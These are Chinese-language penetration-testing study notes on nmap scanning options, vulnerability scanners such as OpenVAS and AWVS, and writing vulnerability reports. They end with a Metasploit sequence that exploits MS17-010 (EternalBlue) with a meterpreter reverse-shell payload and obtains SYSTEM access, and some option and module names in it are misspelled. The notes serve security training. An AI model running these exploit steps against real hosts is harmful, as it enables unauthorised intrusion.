扫描技术

​	扫描

​	自动化

​	提高效率

资产发现

​	发现目标环境中有哪些资产, 联网设备, 主机, 服务器, 各种服务等.

​	资产整理, 发现, 收集

​	扫描神器

​		nmap 效率高 [nmap.org]

​		跨平台 kali自动集成

​		使用kali虚拟机时, 建议网络模式: 桥接

​	主机发现

​		有哪些主机在线, IP地址判定

​	端口扫描

​		确定在线的某一个主机开启的端口

​		端口上的服务

```
nmap 目标地址  # 不指定端口, 默认扫描top 1000个端口
```

​		扫描方式

​			TCP 全连接扫描 `-sT`    会建立完整的TCP三次握手

​			SYN 半连接扫描 `-sS`    只进行三次握手的前两次

​			隐蔽扫描

​				不适用于windows系统

​				畸形数据包

​				Null 扫描 `-sN`

​				Xmas 扫描 `-sX`

​				FIN 扫描 `-sF`

显示服务的详细版本  `-sV`

操作系统 `-O`

保存扫描结果 `-oN(.txt格式)/-oX(.xml格式)`

全面扫描 `-A`

端口状态

​	开放

​	关闭

​	过滤

​	未过滤

​	开放|过滤

​	关闭|过滤

抓包工具

​	wireshark

<<Nmap渗透测试指南>>



**网络漏洞扫描**

市面常用工具: Nessus, NeXpose, OpenVAS等

Nessus商业化了, 其分支OpenVAS依然开源

OpenVAS使用NVT脚本对多种远程系统的安全问题进行检测

**漏洞扫描原理**

网络漏洞扫描: 利用一些**自动化工具**发现网络上各类主机设备的安全漏洞, 自动化工具通常被称为**漏洞扫描器**

分类: 黑盒扫描|白盒扫描

* 黑盒扫描

  **远程识别服务器的**类型和版本, 对服务是和否存在**漏洞**进行判定; 在一些最新的漏洞扫描软件中, 应用了一些更高级的技术, 比如模拟渗透攻击等

* 白盒扫描

  在具有主机操作权限的情况下进行漏洞扫描; 例如微软的补丁更新程序会定期对你的操作系统进行扫描, 查找存在的安全漏洞, 并且向你推送相应的操作系统补丁

  白盒扫描的结果更加准确, 但是一般来说它所识别出来的漏洞, 不应当作为外部渗透测试的最终数据, 因为这些漏洞由于防火墙和各类软件的原因很可能无法在外部渗透测试中得到利用; 同时, 一般情况下, 你是没有机会获取用户名和口令的!

漏洞扫描器  附带一个用于识别主机漏洞的特征库, 并定期进行更新

漏洞扫描的时候, 就是利用特征库里的脚本与目标系统的反馈信息进行匹配, 匹配上说明存在漏洞

漏洞扫描器在识别漏洞的过程中, 会向目标主机发送大量的数据包, 有时候会导致目标系统拒绝服务或者被扫描数据包阻塞, 扫描行为本身也会被对方入侵检测设备所发行

漏洞扫描器扫描出的结果通常会有很多**误报**(报告发现的漏洞实际上并不存在)或者**漏报**(没发现), 因此, 需要对扫描结果进行**人工分析,** 确定哪些漏洞是真实存在的, 这个过程叫做**漏洞验证**; 这是渗透测试过程中不可缺少的一步, 只有验证漏洞存在的真实性, 才能对漏洞进行深度利用

渗透测试的过程中, 在得到客户认可的情况下, 可以使用扫描器进行扫描, 但是使用时一定要注意规避风险, 对其系统运行可能造成的影响降到最低

**OpenVAS**

1. 扫描目标

   需要新建一个目标, 填写相关信息, 点击[Create]

2. 扫描策略

   查看扫描模板, 就是在扫描过程中使用的扫描策略和配置, 也可以自己配置

3. 扫描任务

   创建好目标之后, 创建扫描任务

   新建任务

   填写相关信息, 名称自定义; 扫描目标选择之前配置过的, 会以下拉列表的形式展现

   点击开始按钮开始扫描

4. 扫描完成

5. 扫描报告

   格式自选



**Web漏洞扫描简述**

互联网,云计算的发展---> Web应用越来越多, 而Web应用的攻击成本和难度都比较低

所以Web应用成为黑客攻击的主要目标

人工检测成百上千的页面显然不太现实, 需要借助自动化工具--->Web漏洞扫描器 

市面上 IBM公司的**AppScan**和商业化的Web漏洞扫描器**AWVS**较为优秀

**Web漏洞扫描原理**

​	进行Web漏洞扫描的时候, 大致分为以下几个步骤:

​	@ 爬取网站目录 ?

​		asp

​		.net

​		php

​		java 框架

​		类似链接: http://www.domain/1/2/3/4/hello

​		index.php

​		框架类不建议进行网站目录爬行

​	@ 使用漏洞脚本扫描

​	@ 保存扫描结果

使用AWVS 扫描testfire.net

**AWVS**

Acunetix Web Vulnerability Scanner

* 创建扫描目标

  点击[New Scan], 即可打开扫描向导, 在Website URL中输入网站, 跟着向导一步一步配置即可

  设置扫描策略, 如果没有特殊的要求, 默认即可

  在目标阶段, AWVS会自动识别目标Web服务相关信息, 包括系统, Web容器类型和版本, 中间件信息

  如果网站中有登录表单, 可以将测试账号填写

  AWVS把漏洞分为高危/中危/低危/信息泄露, 四个级别;

* 扫描结果分析

  漏洞页面和漏洞参数

  漏洞描述和测试payload

* 保存报告, pdf格式 .wvs格式



关于漏洞

​	漏洞的名称

​	漏洞的风险等级 {高危|中危|低危|信息泄露}

​		高危: 远程代码执行, 数据获取

​	漏洞的描述

​	漏洞的危害

​		前半部分 固定

​		后半部分 自由发挥

​	修复建议

​		前半部分

​		后半部分



MSF 

​	Metasploit framework 

​	渗透框架

```
msfconsole
```

```
search ms17-010
use exploit/windows/smb/ms17_010_enternalblue
	set payload windows/x64/meterpreter/reverse_tcp
	set RHOSTS 目标地址
	set LHOSTS 本机地址
	exploit
	--------------
	--------------
	getuid
	结果: Server username: NT AUTHORITY\SYSTEM
```

